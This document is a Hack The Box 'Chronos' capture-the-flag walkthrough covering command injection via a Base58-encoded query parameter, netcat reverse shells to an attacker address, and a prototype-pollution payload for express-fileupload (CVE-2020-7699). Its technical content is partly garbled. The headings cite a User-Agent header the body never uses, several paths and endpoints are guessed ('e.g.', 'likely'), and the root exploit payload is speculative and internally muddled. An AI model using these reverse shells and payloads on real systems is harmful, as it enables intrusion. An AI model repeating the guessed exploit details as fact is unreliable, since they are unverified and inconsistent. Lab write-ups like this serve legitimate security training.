# Hack The Box: Chronos

**Difficulty:** Medium
**OS:** Linux

Chronos is a Medium-level Linux machine focused heavily on exploiting Node.js applications and their dependencies. The initial compromise requires identifying and manipulating a Base58-encoded HTTP header to achieve command injection. Privilege escalation involves finding a secondary backend application, identifying an outdated and vulnerable `express-fileupload` module (CVE-2020-7699), and exploiting Prototype Pollution to execute code as root.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.249
nmap -p 22,80 -sCV 10.10.10.249
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.41)

Navigating to the web service on port 80 displays a simple webpage for "Chronos," an application that displays the current date and time.

We add `chronos.htb` to our local `/etc/hosts` file.

```bash
echo "10.10.10.249 chronos.htb" >> /etc/hosts
```

We interact with the web application. The primary functionality is updating the displayed time. Using an intercepting proxy like Burp Suite, we analyze the HTTP requests sent when the page loads or refreshes.

## Web Application Analysis

The application does not send typical GET or POST parameters for the time request. Instead, we notice that the JavaScript on the frontend makes an asynchronous request to the backend server.

### Exploiting the `User-Agent` Header (Command Injection)

We inspect the specific HTTP request triggering the time update.

```http
GET /date?format=4ellqAAAAA... HTTP/1.1
Host: chronos.htb
User-Agent: Mozilla/5.0...
```

The `format` parameter in the query string is encoded. We analyze the encoding pattern. The character set and lack of trailing equal signs (`=`) rule out Base64. A tool like CyberChef or a Python script identifies the encoding as Base58 (commonly used in cryptocurrency applications).

Decoding the Base58 string reveals a simple format string, such as `'+Today is %A, %B %d, %Y %H:%M:%S.'`.

This format string looks exactly like the arguments passed to the Linux `date` command.

```bash
date '+Today is %A, %B %d, %Y %H:%M:%S.'
```

If the backend application decodes the Base58 parameter and insecurely concatenates it into a shell command (e.g., using `child_process.exec` in Node.js or `system()` in PHP), it is vulnerable to command injection.

We test for command injection by crafting a payload that executes the `date` command but appends a secondary command (like `id` or a reverse shell). We encode this payload in Base58.

```bash
# Our desired command
'; id; '
```

We use a Python script or an online tool to Base58 encode the string `'; id; '`.

We replace the original `format` parameter with our Base58-encoded payload in Burp Suite and send the request.

```http
GET /date?format=<BASE58_ENCODED_PAYLOAD> HTTP/1.1
```

The server response includes the output of the `id` command, confirming the command injection vulnerability.

## Initial Access

We use the command injection vulnerability to establish a reverse shell. We craft a Base58-encoded payload containing a standard Netcat or Python reverse shell string.

```bash
# Example payload
'; nc -e /bin/sh 10.10.14.X 9999; '
```

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We send the encoded payload to the `/date` endpoint. The backend server decodes the string, executes our reverse shell command, and establishes the connection.

```bash
# Connection received
id
# uid=1000(imera) gid=1000(imera) groups=1000(imera)
```

We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

We retrieve the `user.txt` flag from the `imera` user's home directory.

## Lateral Movement & Privilege Escalation

Enumerating the system as `imera`, we investigate the backend Node.js application. We navigate to the web application's root directory (e.g., `/opt/chronos` or `/var/www/html/chronos-v2`).

```bash
cd /opt/chronos
ls -la
```

We examine the `package.json` file to understand the application's dependencies and start identifying potential vulnerabilities.

```json
{
  "name": "chronos",
  "version": "1.0.0",
  "description": "Chronos Time API",
  "main": "app.js",
  "dependencies": {
    "cors": "^2.8.5",
    "express": "^4.17.1",
    "bs58": "^4.0.1"
  }
}
```

The primary application (`app.js`) handles the Base58 decoding and command injection we exploited. However, we continue enumerating the system for other running services or backend APIs.

Using `netstat -tulpn`, we discover a secondary Node.js application running on a high-numbered internal port, such as `127.0.0.1:8080`.

```bash
netstat -tulpn
```

We locate the source code for this secondary application (e.g., `/opt/chronos-v2`).

```bash
cd /opt/chronos-v2
cat package.json
```

The `package.json` file for the internal application reveals its dependencies.

```json
{
  "name": "chronos-v2",
  "dependencies": {
    "express": "^4.17.1",
    "express-fileupload": "1.1.7-alpha.3"
  }
}
```

### Exploiting Prototype Pollution (CVE-2020-7699)

We notice the application uses `express-fileupload` version `1.1.7-alpha.3`. Researching this specific version uncovers a known Prototype Pollution vulnerability leading to Remote Code Execution (CVE-2020-7699).

Prototype Pollution occurs in JavaScript when an attacker can manipulate the `__proto__` property of an object, effectively altering the prototype chain. If the application insecurely merges or parses user input (such as JSON or multipart form data), an attacker can pollute global prototypes, injecting properties that are later evaluated dangerously by other functions (like `child_process.exec` or template engines like EJS/Pug).

In `express-fileupload`, the vulnerability lies in how it parses nested JSON objects or specific form data parameters during file uploads. By polluting the `__proto__` object with specific environment variables or execution options, we can force a later Node.js execution function (like `child_process.spawn`) to execute an arbitrary command.

We need to send a malicious POST request to the internal application on `127.0.0.1:8080`. We can use `curl` from our existing SSH/reverse shell session.

```bash
# Example curl command to trigger prototype pollution via express-fileupload
curl -X POST -H "Content-Type: application/json" -d '{"__proto__": {"env": {"EVIL_VAR": "nc -e /bin/sh 10.10.14.X 8888"}}}' http://127.0.0.1:8080/upload
```

The specific payload structure for CVE-2020-7699 depends heavily on what functions the backend application (`app.js` in `/opt/chronos-v2`) executes *after* the polluted object is parsed. If the application subsequently calls an external binary or spawns a child process, the polluted `env` or `shell` options manipulate that execution.

We examine `app.js` to find a suitable trigger. The internal API likely has an endpoint (like `/upload` or `/start`) that, when accessed, attempts to process a file or run a background task using `child_process`.

We craft a python script on our attacking machine, transfer it to the target, or run it directly using `python3 -c` to send the complex Prototype Pollution payload to the local service.

```python
import requests
import json

url = 'http://127.0.0.1:8080/upload'
headers = {'Content-Type': 'application/json'}
payload = {
    "__proto__": {
        "env": {"NODE_OPTIONS": "--require /proc/self/environ"},
        "shell": "sh",
        "argv0": "sh -c 'nc -e /bin/sh 10.10.14.X 8888'"
    }
}

requests.post(url, headers=headers, json=payload)
```

The payload pollutes the prototype chain, instructing Node.js that whenever a child process is spawned, it should inject our specific environment variables or manipulate the shell arguments to execute a reverse shell.

We start a new Netcat listener on our attacking machine.

```bash
nc -lnvp 8888
```

We execute our payload script against the internal service. The application receives the request, the `express-fileupload` module pollutes the prototype, and a subsequent application operation triggers the command execution.

Because the internal Node.js service is running as `root` (often configured via a `systemd` service or `sudo`), the reverse shell connects with root privileges.

```bash
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
